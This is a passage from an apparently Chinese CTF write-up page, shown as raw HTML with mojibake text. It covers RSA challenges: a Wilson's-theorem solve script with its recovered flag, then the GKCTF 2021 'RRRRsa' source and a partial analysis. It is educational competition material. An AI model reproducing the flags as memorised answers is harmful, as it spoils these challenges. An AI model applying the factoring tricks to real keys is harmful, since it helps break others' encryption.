style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p>æœ‰:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub><mo>=</mo><mi>m</mi><mo>âˆ—</mo><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo>âˆ’</mo><mi>q</mi><mo stretchy="false">)</mo><mo stretchy="false">!</mo></mrow><annotation encoding="application/x-tex">m_0=m*(p-1-q)!</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mclose">!</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mn>2</mn><mi>e</mi></msup><mo>=</mo><mi>c</mi><mn>2</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">2^e=c2\quad mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi>m</mi><mn>0</mn><mi>e</mi></msubsup><mo>=</mo><mi>c</mi><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m_0^e=c1\quad mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9613919999999999em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><p>ç”±äºŒå¼å¯ä»¥å¾—åˆ°kå€çš„n</p><p>qæ˜¯ä¸€ä¸ªæ¯”è¾ƒå°çš„æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥çˆ†ç ´ï¼Œç„¶åæ±‚åˆ°kp</p><p>æˆ‘ä»¬å»åœ¨çº¿ç½‘ç«™è¿›è¡Œåˆ†è§£ï¼Œå¯ä»¥å¾—åˆ°p</p><p>ç„¶åæ±‚è§£å¾—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">m_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>æœ€åæ ¹æ®å¨å°”é€Šå®šç†,æˆ‘ä»¬å¯¹m0ä»p-qä¹˜åˆ°p-1å¯ä»¥å¾—åˆ°-m mod(p)</p><p>ç„¶åå¯¹-1æ±‚é€†å…ƒå°±å¯ä»¥å¾—åˆ°m</p><h2 id="exp-10"><a class="markdownIt-Anchor" href="#exp-10"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>c2=<span class="hljs-number">4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377</span><br>c1=<span class="hljs-number">3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270</span><br>e=<span class="hljs-number">1049</span><br>kn=<span class="hljs-number">2</span>**<span class="hljs-number">1049</span>-c2<br><span class="hljs-string">&quot;&quot;&quot;for i in range(1&lt;&lt;15,1&lt;&lt;16):</span><br><span class="hljs-string">    if isPrime(i) and kn%i==0:</span><br><span class="hljs-string">        q=i</span><br><span class="hljs-string">        print(q)</span><br><span class="hljs-string">        print(kn//q)</span><br><span class="hljs-string">        break</span><br><span class="hljs-string">        #34211</span><br><span class="hljs-string">        #176187289150514462046172630174700088525221325866312783639426750020851677271339945780081598171833449310803326466412109196489585032131454474980855474525268996498728189708770015967359856986040467410546755834813513311041394212977692161618099683277808044775858602607121850124014360450965062461065243304016148002474085</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>q=<span class="hljs-number">34211</span>    <br>p=<span class="hljs-number">170229264879724117919007372149468684565431232721075153274808454126426741324966131188484635914814926870341378228417496808202497615585946352638507704855332363766887139815236730403246238633855524068161116748612090155595549964229654262432946553891601975628848891407847198187453488358420350203927771308228162321231</span><br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,e,p*q)==c2<br><br>m0=<span class="hljs-built_in">pow</span>(c1,invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),p*q)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(p-q,p):<br>    m0=(m0*i)%p<br><span class="hljs-built_in">print</span>(long_to_bytes((<span class="hljs-built_in">int</span>(m0)*invert(-<span class="hljs-number">1</span>,p))%p))<br><span class="hljs-comment">#b&quot;flag&#123;7h3_73rr1b13_7h1ng_15_7h47_7h3_p457_c4n&#x27;7_b3_70rn_0u7_by_175_r0075&#125;&quot;</span><br><span class="hljs-comment">#NSSCTF&#123;7h3_73rr1b13_7h1ng_15_7h47_7h3_p457_c4n&#x27;7_b3_70rn_0u7_by_175_r0075&#125;</span><br></code></pre></td></tr></table></figure><h1 id="gkctf-2021rrrrsa"><a class="markdownIt-Anchor" href="#gkctf-2021rrrrsa"></a> [GKCTF 2021]RRRRsa</h1><h2 id="é¢˜ç›®-11"><a class="markdownIt-Anchor" href="#é¢˜ç›®-11"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gcd<br><br>flag = <span class="hljs-string">b&#x27;xxxxxxxxxxxxx&#x27;</span><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>m = bytes_to_long(flag)<br>n = p*q<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c))<br><br>p1 = getPrime(<span class="hljs-number">512</span>)<br>q1 = getPrime(<span class="hljs-number">512</span>)<br>n1 = p1*q1<br>e1 = <span class="hljs-number">65537</span><br><span class="hljs-keyword">assert</span> gcd(e1,(p1-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)) == <span class="hljs-number">1</span><br>c1 = <span class="hljs-built_in">pow</span>(p,e1,n1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n1=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(n1))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c1=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c1))<br>hint1 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2020</span> * p1 + q1, <span class="hljs-number">202020</span>, n1)<br>hint2 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2021</span> * p1 + <span class="hljs-number">212121</span>, q1, n1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hint1=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(hint1))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hint2=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(hint2))<br><br>p2 = getPrime(<span class="hljs-number">512</span>)<br>q2 = getPrime(<span class="hljs-number">512</span>)<br>n2 = p2*q2<br>e2 = <span class="hljs-number">65537</span><br><span class="hljs-keyword">assert</span> gcd(e1,(p2-<span class="hljs-number">1</span>)*(q2-<span class="hljs-number">1</span>)) == <span class="hljs-number">1</span><br>c2 = <span class="hljs-built_in">pow</span>(q,e2,n2)<br>hint3 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2020</span> * p2 + <span class="hljs-number">2021</span> * q2, <span class="hljs-number">202020</span>, n2)<br>hint4 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2021</span> * p2 + <span class="hljs-number">2020</span> * q2, <span class="hljs-number">212121</span>, n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n2=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(n2))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c2=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c2))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hint3=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(hint3))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hint4=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(hint4))<br><br><span class="hljs-comment">#c=13492392717469817866883431475453770951837476241371989714683737558395769731416522300851917887957945766132864151382877462142018129852703437240533684604508379950293643294877725773675505912622208813435625177696614781601216465807569201380151669942605208425645258372134465547452376467465833013387018542999562042758</span><br><span class="hljs-comment">#n1=75003557379080252219517825998990183226659117019770735080523409561757225883651040882547519748107588719498261922816865626714101556207649929655822889945870341168644508079317582220034374613066751916750036253423990673764234066999306874078424803774652754587494762629397701664706287999727238636073466137405374927829</span><br><span class="hljs-comment">#c1=68111901092027813007099627893896838517426971082877204047110404787823279211508183783468891474661365139933325981191524511345219830693064573462115529345012970089065201176142417462299650761299758078141504126185921304526414911455395289228444974516503526507906721378965227166653195076209418852399008741560796631569</span><br><span class="hljs-comment">#hint1=23552090716381769484990784116875558895715552896983313406764042416318710076256166472426553520240265023978449945974218435787929202289208329156594838420190890104226497263852461928474756025539394996288951828172126419569993301524866753797584032740426259804002564701319538183190684075289055345581960776903740881951</span><br><span class="hljs-comment">#hint2=52723229698530767897979433914470831153268827008372307239630387100752226850798023362444499211944996778363894528759290565718266340188582253307004810850030833752132728256929572703630431232622151200855160886614350000115704689605102500273815157636476901150408355565958834764444192860513855376978491299658773170270</span><br><span class="hljs-comment">#n2=114535923043375970380117920548097404729043079895540320742847840364455024050473125998926311644172960176471193602850427607899191810616953021324742137492746159921284982146320175356395325890407704697018412456350862990849606200323084717352630282539156670636025924425865741196506478163922312894384285889848355244489</span><br><span class="hljs-comment">#c2=67054203666901691181215262587447180910225473339143260100831118313521471029889304176235434129632237116993910316978096018724911531011857469325115308802162172965564951703583450817489247675458024801774590728726471567407812572210421642171456850352167810755440990035255967091145950569246426544351461548548423025004</span><br><span class="hljs-comment">#hint3=25590923416756813543880554963887576960707333607377889401033718419301278802157204881039116350321872162118977797069089653428121479486603744700519830597186045931412652681572060953439655868476311798368015878628002547540835719870081007505735499581449077950263721606955524302365518362434928190394924399683131242077</span><br><span class="hljs-comment">#hint4=104100726926923869566862741238876132366916970864374562947844669556403268955625670105641264367038885706425427864941392601593437305258297198111819227915453081797889565662276003122901139755153002219126366611021736066016741562232998047253335141676203376521742965365133597943669838076210444485458296240951668402513</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-11"><a class="markdownIt-Anchor" href="#åˆ†æ-11"></a> åˆ†æ</h2><p>ç›®çš„æ˜¯æ±‚è§£åŠ å¯†flagçš„på’Œq</p><h3 id="æ±‚è§£p"><a class="markdownIt-Anchor" href="#æ±‚è§£p"></a> æ±‚è§£pï¼š</h3><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2020</mn><mo>âˆ—</mo><msub><mi>p</mi><mn>1</mn></msub><mo>+</mo><msub><mi>q</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mn>202020</mn></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hint1=(2020*p_1+q_1)^{202020}\quad mod(n_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>2</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2021</mn><mo>âˆ—</mo><msub><mi>p</mi><mn>1</mn></msub><mo>+</mo><mn>212121</mn><msup><mo stretchy="false">)</mo><msub><mi>q</mi><mn>1</mn></msub></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hint2=(2021*p_1+212121)^{q_1}\quad mod(n_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714392em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>å°†äºŒå¼éƒ½å˜æˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">mod(q_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>æ ¹æ®äºŒé¡¹å¼å®šç†ï¼Œå‡ºäº†ç¬¬ä¸€é¡¹å¤–ï¼Œå…¶ä»–é¡¹éƒ½æœ‰<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>éƒ½å¯ä»¥æ¶ˆæ‰</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2020</mn><mo>âˆ—</mo><mi>p</mi><msup><mo stretchy="false">)</mo><mn>202020</mn></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hint1=(2020*p)^{202020}\quad mod(q_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span 